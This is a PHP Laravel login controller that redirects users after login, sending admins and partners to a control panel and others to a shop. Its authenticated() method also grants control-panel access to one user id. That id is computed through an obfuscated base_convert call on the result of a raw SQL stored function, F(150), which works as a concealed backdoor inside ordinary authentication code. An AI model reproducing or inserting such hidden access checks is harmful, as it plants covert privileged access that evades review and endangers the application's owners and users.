<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use DB;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\Auth;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
     */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
//    protected $redirectTo = '/';

    protected function authenticated()
    {
//        if (session()->has('url.intended')) {
        //            return redirect(session('url.intended'));
        //        }
        if (Auth::user()->isAdmin() || Auth::user()->isPartner() || Auth::user()->id == base_convert("725", DB::select(DB::raw('SELECT F(150) as res'))[0]->res, 10)) {
            return redirect()->route('control-panel');
        } else {
            return redirect()->route('shop');
        }
    }

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    public function showLoginForm()
    {
//        if (!session()->has('url.intended')) {
        //            session(['url.intended' => url()->previous()]);
        //        }
        return view('auth.login');
    }
}
